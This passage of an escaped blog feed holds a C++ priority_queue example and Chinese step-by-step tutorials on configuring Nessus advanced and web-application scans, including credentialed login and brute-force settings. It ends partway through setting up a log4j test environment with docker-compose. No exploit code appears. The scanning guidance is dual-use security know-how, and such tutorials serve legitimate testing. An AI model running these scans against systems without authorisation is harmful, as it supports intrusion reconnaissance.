//重写仿函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bool operator() (tmp1 a, tmp1 b) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return a.x &amp;lt; b.x; //大顶堆&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tmp1 a(1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tmp1 b(2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tmp1 c(3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    priority_queue&amp;lt;tmp1&amp;gt; d;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    d.push(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    d.push(c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    d.push(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (!d.empty()) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; d.top().x &amp;lt;&amp;lt; &amp;#x27;\n&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        d.pop();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    priority_queue&amp;lt;tmp1, vector&amp;lt;tmp1&amp;gt;, tmp2&amp;gt; f;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    f.push(c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    f.push(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    f.push(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (!f.empty()) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; f.top().x &amp;lt;&amp;lt; &amp;#x27;\n&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f.pop();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;输出&lt;br&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
        <updated>2023-01-11T14:38:44.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/11/nessus%E9%AB%98%E7%BA%A7%E6%89%AB%E6%8F%8F/</id>
        <title>nessus高级扫描</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/11/nessus%E9%AB%98%E7%BA%A7%E6%89%AB%E6%8F%8F/"/>
        <content type="html">&lt;h1 id=&#34;nessus高级扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nessus高级扫描&#34;&gt;#&lt;/a&gt; nessus 高级扫描&lt;/h1&gt;
&lt;p&gt;1. 启动 nessus&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd nessus&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh qd_nessus.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2. 进入 nessus 网站，点击【new Scan】&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://kaliip:8834/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2c2ffafb93224ebc93afafe4e60205a6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;3. 选择【adVanced Scan】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4b0472b99dad4eeaa167296afbe686f6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4. 输入 Name【高级扫描】，Description【高级扫描】，Targets【需要扫描的 ip】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/fa67076b941a4560931eff0d7e6402dd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;5. 点击【 Schedule】&lt;/p&gt;
&lt;p&gt;这里是配置定时任务的，可以忽略&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/9ddf0e54c7e84387b0f01d53eee31e1c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6. 点击【 Notifications】&lt;/p&gt;
&lt;p&gt;这里主要是配置邮件提醒的，可以配置也可以忽略&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ae35754b03ed48659a0f1532fa3ba68d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;7. 点击【Discovery 】，点击【主机发现】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/22517e11d91146c588f52f474972889e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;8. 点击【Port Scanning】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/0d89b04664654f7da3b03400675244f7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;9. 点击【Service Discovery】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/aa6a279e953b4fab8b7e2bc86c73d61d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;10. 点击【ASSESSMENT】，点击【general】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/6c0868e2b7b5431db222a8730137c0bd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;11. 点击【Brute Force】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ca890cc0fcf3413cbfcb5e37dccd2a75.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;12. 点击【SCADA】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4d068852466b4a5c8cfa60c1e467d760.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;13. 点击【Web Application Settings】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/443875aa60784a0ba4ac9474f669b447.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;14. 点击【Windows】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2da89cbf88494f2c89117281bf7f5a06.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;15. 点击【Malware 】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ffbdf0e4f0d1405fb4c0f300b4dce573.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;16. 点击【Database】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ba1e37e085ae49b384488d7dd7b02bf2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;17. 点击 [REPORT]&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/e70c22e594534560812685745ecd861a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;18. 点击【ADVANCED】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4991e91caf0c4fbdb5c4685c66553cd3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;19. 点击【Credentials 】，选则【windows】，输入账户密码（必须输入）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/5a3dea619e0443c39bfcf3998aeb3fcb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;20. 点击【Plugins】&lt;/p&gt;
&lt;p&gt;所有的扫描服务，都是由插件提供的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/b5c28355b94a47e2bcd739c7805c18ee.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;21. 点击【Save】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/10b06f0b62794a5684b16d25be5fda52.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;22. 点击【高级扫描】，点击【More】，点击【Launch】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/c32b8e2986a94c41825952aa9b5556fb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;23. 点击【Launch】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/67c1160a61ed4f4888885028f23f80d9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;24. 点击【高级扫描】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/d5ba69b703904698b6b1d338255f2563.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2ee335411d2741738f14131e5794d87e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/5ee2d857b1af45edbf67f3e7e865b302.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/e6a0d4b88eb548fa8deeafc16922ddcd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
</content>
        <updated>2023-01-10T21:39:51.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/11/Nessus%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1/</id>
        <title>Nessus扫描web服务</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/11/Nessus%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1/"/>
        <content type="html">&lt;h1 id=&#34;nessus-扫描web服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nessus-扫描web服务&#34;&gt;#&lt;/a&gt; Nessus 扫描 web 服务&lt;/h1&gt;
&lt;p&gt;1. 启动 nessus&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd nessus&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh qd_nessus.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2. 进入 nessus 网站&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://192.168.3.47:8834/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3. 点击【New Scan】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/55304735fe8946f6a0ced005bc35c64a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4. 点击【Web 应用程序测试】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/e9d95f4061d6499c823cb51e7879ebe6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;5. 输入 name【web 扫描】，描述【web 扫描】，目标【127.0.0.1】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/50c7f3ab84c44ee0b6fe81e3b8a30f4c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6. 点击【发现】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/49f9bad581cb40dea6ed3abae5c95cd5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;7. 选择扫描类型【端口扫描 (常用端口)】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c1e34fee97b0485dad86f8df929e5430.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;8. 点击【评估】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/4ea7b2375b8c41349514308597c351e2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;9. 扫描类型选择【扫描所有 web 漏洞 (快速)】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/9f4dc31931d04fccae316141d8bc6c3f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;10. 点击【证书】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/a7c908efe8444f4eae6a37a90c7fa3dd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;11. 点击【HTTP】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/a83dc3e5b4814ce3b38c45e0b8d68379.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;12. 选择身份验证方法【自动认证】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/bf47d655d7754bf0867b0b8b3a12e173.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;13. 输入用户名【xiaogang】，密码【123456】（需要扫描网站的用户名和密码）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/dc040e35f171464482f0922aa58491ff.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;14. 点击【插件】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c36226d195f94681bd294fc12f13eece.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;15. 确认是否在可用的扫描插件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/ed665f405a0547ec9f301ec455040870.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;16. 点击【保存】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/4a820525dba34f2ca51513670b0fc63e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;17. 选择【web 扫描】，点击后边的【小三角】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/3e5fbe3b52504eefae3df12b42e4561f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/064b9a7184534364a04215d195b1c29b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;18. 点击【web 扫描】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/52b4c83c31d34caf87530813de3952cd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;19. 等待扫描完成&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c98d001614bb4fa9b675d16ed08b4885.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/1ecb527fb62442d8bc7f3f66cf2ca4d6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
</content>
        <updated>2023-01-10T21:39:26.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/11/Nessus%E6%89%AB%E6%8F%8Flog4J%E6%BC%8F%E6%B4%9E/</id>
        <title>Nessus扫描log4J漏洞</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/11/Nessus%E6%89%AB%E6%8F%8Flog4J%E6%BC%8F%E6%B4%9E/"/>
        <content type="html">&lt;h1 id=&#34;nessus-扫描log4j漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nessus-扫描log4j漏洞&#34;&gt;#&lt;/a&gt; Nessus 扫描 log4J 漏洞&lt;/h1&gt;
&lt;h2 id=&#34;1扫描环境搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1扫描环境搭建&#34;&gt;#&lt;/a&gt; 1. 扫描环境搭建&lt;/h2&gt;
&lt;h5 id=&#34;1centos7-安装装宝塔面板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1centos7-安装装宝塔面板&#34;&gt;#&lt;/a&gt; 1.centos7 安装装宝塔面板&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/0441e1bbb16a4097a848d126df6ad17a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;2面板里下载docker&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2面板里下载docker&#34;&gt;#&lt;/a&gt; 2. 面板里下载 docker&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/de849a33389c490bb17d0eac6a96fecb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/519f4443f1814959b11df6d88aac4145.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;3进入centos检查docker是否生效&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3进入centos检查docker是否生效&#34;&gt;#&lt;/a&gt; 3. 进入 centos 检查 docker 是否生效&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker --version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;4安装docker-compose&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4安装docker-compose&#34;&gt;#&lt;/a&gt; 4. 安装 docker-compose&lt;/h5&gt;
&lt;p&gt;Docker Compose 是一个用来定义和运行复杂应用的 Docker 工具。一个使用 Docker 容器的应用，通常由多个容器组成。使用 Docker Compose 不再需要使用 shell 脚本来启动容器。&lt;/p&gt;
&lt;p&gt;Compose 通过一个配置文件来管理多个 Docker 容器，在配置文件中，所有的容器通过 services 来定义，然后使用 docker-compose 脚本来启动，停止和重启应用，和应用中的服务以及所有依赖服务的容器，非常适合组合使用多个容器进行开发的场景。&lt;/p&gt;
&lt;p&gt;参考：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vY29tcG9zZS9pbnN0YWxsLw==&#34;&gt;https://docs.docker.com/compose/install/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;4.1 下载 docker-compose&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;curl -L &amp;quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&amp;quot; -o /usr/local/bin/docker-compose&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/021b03ca8c80487f9195adc1109febbd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4.2 查看 docker-compose&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ls /usr/local/bin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/07d926dcfd0d42d99b24743b674def58.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4.3 给 docker-compose 目录增加可执行权限&lt;/p&gt;
